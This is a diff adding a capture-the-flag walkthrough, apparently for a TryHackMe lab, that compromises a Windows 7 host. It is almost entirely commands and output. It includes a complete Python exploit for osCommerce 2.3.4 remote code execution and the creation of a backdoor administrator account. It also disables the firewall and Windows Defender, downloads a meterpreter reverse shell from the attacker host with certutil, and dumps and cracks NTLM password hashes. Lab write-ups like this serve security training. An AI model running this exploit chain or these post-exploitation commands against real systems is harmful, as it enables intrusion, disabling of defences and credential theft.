@@ -1,0 +1,419 @@
+## Exploit using the following code
+```
+#!/usr/bin/env python3
+..snipped..
+import requests
+import sys
+import argparse
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="osCommerce 2.3.4 RCE Exploit")
+    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://target-url/oscommerce-2.3.4/catalog)")
+    return parser.parse_args()
+
+def rce(command, baseUrl, proxies):
+    targetUrl = baseUrl + '/install/install.php?step=4'
+
+    payload = "');passthru('" + command + "');/*"
+
+    data = {
+        'DIR_FS_DOCUMENT_ROOT': './',
+        'DB_DATABASE': payload
+    }
+
+    response = requests.post(targetUrl, data=data, proxies=proxies, verify=False)
+
+    if response.status_code == 200:
+        readCMDUrl = baseUrl + '/install/includes/configure.php'
+        cmd = requests.get(readCMDUrl, proxies=proxies, verify=False)
+
+        if cmd.status_code == 200:
+            commandRsl = cmd.text.split('\n')
+            for line in commandRsl[2:]:
+                print(line)
+        else:
+            return '[!] configure.php not found'
+    else:
+        return '[!] Failed to inject payload'
+
+def main():
+    args = parse_args()
+    baseUrl = args.url
+    proxies = {
+        "http": "http://localhost:8080",
+        "https": "http://localhost:8080"
+    }
+
+    testVulnUrl = baseUrl + '/install/install.php'
+    test = requests.get(testVulnUrl, proxies=proxies, verify=False)
+
+    if test.status_code == 200:
+        print('[*] Install directory still available, the host likely vulnerable to the exploit.')
+        print('[*] Testing injecting system command to test vulnerability')
+        print('User: ', end='')
+        err = rce("whoami", baseUrl, proxies)
+
+        if err:
+            print(err)
+            sys.exit(1)
+
+        while True:
+            cmd = input('RCE_SHELL$ ')
+            err = rce(cmd, baseUrl, proxies)
+            if err:
+                print(err)
+                sys.exit(1)
+    else:
+        print('[!] Install directory not found, the host is not vulnerable')
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+```
+
+
+## Run exploit
+```
+$ python3 exploit.py -u http://blueprint.thm:8080/oscommerce-2.3.4/catalog/                   
+[*] Install directory still available, the host likely vulnerable to the exploit.
+[*] Testing injecting system command to test vulnerability
+User: nt authority\system
+```
+
+
+## Confirm privileges
+```
+RCE_SHELL$ whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
+SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeTcbPrivilege                  Act as part of the operating system       Enabled 
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Enabled 
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Enabled 
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
+SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeAuditPrivilege                Generate security audits                  Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled 
+SeTimeZonePrivilege             Change the time zone                      Enabled 
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 
+```
+
+
+## Create local administrator
+```
+RCE_SHELL$ net user localadmin P@ssw0rd /add
+The command completed successfully.
+
+
+RCE_SHELL$ net localgroup administrators localadmin /add
+The command completed successfully.
+
+
+RCE_SHELL$ net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+localadmin
+The command completed successfully.
+```
+
+
+## Disable firewall
+```
+RCE_SHELL$ netsh advfirewall set allprofiles state off
+Ok.
+
+RCE_SHELL$ netsh advfirewall show allprofiles
+
+Domain Profile Settings: 
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Enable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+
+Private Profile Settings: 
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Enable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+
+Public Profile Settings: 
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Enable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Ok.
+```
+
+
+## Create temp directory and make it active as smb-share
+```
+RCE_SHELL$ mkdir c:\temp
+
+RCE_SHELL$ net share loot=C:\temp /grant:Everyone,full
+loot was shared successfully.
+
+RCE_SHELL$ net share
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share                     
+IPC$                                         Remote IPC                        
+ADMIN$       C:\Windows                      Remote Admin                      
+loot         C:\temp                         
+Users        C:\Users                        
+Windows      C:\Windows                      
+The command completed successfully.
+```
+
+
+## Stop win-defender
+```
+RCE_SHELL$ sc stop WinDefend
+
+SERVICE_NAME: WinDefend 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+RCE_SHELL$ sc config WinDefend start= disabled
+[SC] ChangeServiceConfig SUCCESS
+
+RCE_SHELL$ sc query WinDefend
+
+SERVICE_NAME: WinDefend 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 1  STOPPED 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+```
+
+## psexec failed - maybe due to wrong arch
+```
+msf6 exploit(windows/smb/psexec) > run
+[*] Started reverse TCP handler on 10.14.28.97:443 
+[*] 10.10.161.90:445 - Connecting to the server...
+[*] 10.10.161.90:445 - Authenticating to 10.10.161.90:445 as user 'localadmin'...
+[*] 10.10.161.90:445 - Selecting native target
+[!] 10.10.161.90:445 - peer_native_os is only available with SMB1 (current version: SMB2)
+[*] 10.10.161.90:445 - Uploading payload... dJCjYpLa.exe
+[*] 10.10.161.90:445 - Created \dJCjYpLa.exe...
+[-] 10.10.161.90:445 - ERROR_ACCESS_DENIED opening the Service Manager
+[*] 10.10.161.90:445 - Deleting \dJCjYpLa.exe...
+[*] Exploit completed, but no session was created.
+```
+
+
+## Download shell and run -- Fail
+```
+-- Target
+RCE_SHELL$ certutil -urlcache -split -f http://10.14.28.97/shell.exe c:\temp\shell.exe
+****  Online  ****
+  000000  ...
+  033600
+CertUtil: -URLCache command completed successfully.
+
+RCE_SHELL$ dir \temp      
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\temp
+
+04/14/2025  03:29 PM    <DIR>          .
+04/14/2025  03:29 PM    <DIR>          ..
+04/14/2025  03:29 PM           210,432 shell.exe
+               1 File(s)        210,432 bytes
+               2 Dir(s)  19,380,666,368 bytes free
+
+-- Attack machine
+msf6 exploit(multi/handler) > set lhost tun0
+lhost => 10.14.28.97
+
+msf6 exploit(multi/handler) > set lport 443
+lport => 443
+
+msf6 exploit(multi/handler) > options 
+
+Payload options (windows/x64/meterpreter_reverse_tcp):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   EXTENSIONS                   no        Comma-separate list of extensions to load
+   EXTINIT                      no        Initialization strings for extensions
+   LHOST       10.14.28.97      yes       The listen address (an interface may be specified)
+   LPORT       443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.14.28.97:443 
+
+-- Wrong archictecture (must use x86 instead of x64)
+┌──(kali㉿kali)-[~/thm/blueprint]
+└─$ nxc smb blueprint.thm -u localadmin -p P@ssw0rd -x 'cmd /c c:\\temp\shell.exe'
+SMB         10.10.161.90    445    BLUEPRINT        [*] Windows 7 Home Basic 7601 Service Pack 1 x32 (name:BLUEPRINT) (domain:BLUEPRINT) (signing:False) (SMBv1:True)
+SMB         10.10.161.90    445    BLUEPRINT        [+] BLUEPRINT\localadmin:P@ssw0rd (Pwn3d!)
+SMB         10.10.161.90    445    BLUEPRINT        [+] Executed command via wmiexec
+SMB         10.10.161.90    445    BLUEPRINT        This version of c:\temp\shell.exe is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need a x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.
+                                                                                                                  
+```
+
+
+## Redownload shell and execute
+```
+┌──(kali㉿kali)-[~/thm/blueprint]
+└─$ nxc smb blueprint.thm -u localadmin -p P@ssw0rd -x 'certutil -urlcache -split -f http://10.14.28.97/shell.exe c:\temp\shell.exe'
+SMB         10.10.161.90    445    BLUEPRINT        [*] Windows 7 Home Basic 7601 Service Pack 1 x32 (name:BLUEPRINT) (domain:BLUEPRINT) (signing:False) (SMBv1:True)
+SMB         10.10.161.90    445    BLUEPRINT        [+] BLUEPRINT\localadmin:P@ssw0rd (Pwn3d!)
+SMB         10.10.161.90    445    BLUEPRINT        [+] Executed command via wmiexec
+SMB         10.10.161.90    445    BLUEPRINT        ****  Online  ****
+SMB         10.10.161.90    445    BLUEPRINT        000000  ...
+SMB         10.10.161.90    445    BLUEPRINT        03dc00
+SMB         10.10.161.90    445    BLUEPRINT        CertUtil: -URLCache command completed successfully.
+
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.14.28.97:443 
+[*] Sending stage (177734 bytes) to 10.10.161.90
+[*] Meterpreter session 1 opened (10.14.28.97:443 -> 10.10.161.90:49423) at 2025-04-14 23:14:00 +0800
+```
+
+
+## On meterpreter - hashdump
+```
+meterpreter > getuid
+Server username: BLUEPRINT\localadmin
+
+meterpreter > hashdump 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
+localadmin:1002:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+```
+
+
+## On meterpreter - Get root.txt
+```
+C:\Users\Administrator>cd desktop
+
+C:\Users\Administrator\Desktop>dir      
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/27/2019  07:15 PM    <DIR>          .
+11/27/2019  07:15 PM    <DIR>          ..
+11/27/2019  07:15 PM                37 root.txt.txt
+               1 File(s)             37 bytes
+               2 Dir(s)  19,380,146,176 bytes free
+```
+
+
+## Using hashcat to crack hashes - on mac (kaonashi because rockyou.txt doesn't cut it)
+```
+% hashcat -m 1000 hash.txt ./kaonashi.txt -o cracked.out 
+..snipped..
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: hash.txt
+Time.Started.....: Mon Apr 14 23:33:55 2025 (28 secs)
+Time.Estimated...: Mon Apr 14 23:34:23 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (./kaonashi.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 31444.0 kH/s (5.08ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
+Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new)
+Progress.........: 866508697/866508697 (100.00%)
+Rejected.........: 0/866508697 (0.00%)
+Restore.Point....: 866508697/866508697 (100.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: $HEX[21212121617574656e746963613037212121] -> $HEX[00000000000000000000000000000000]
+Hardware.Mon.SMC.: Fan0: 20%
+Hardware.Mon.#1..: Util: 29%
+
+Started: Mon Apr 14 23:33:23 2025
+Stopped: Mon Apr 14 23:34:25 2025
+
+% cat cracked.out 
+30e87bf999828446a1c1209ddde4c450:googleplus
+
+% cat hash.txt 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
+Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
+```
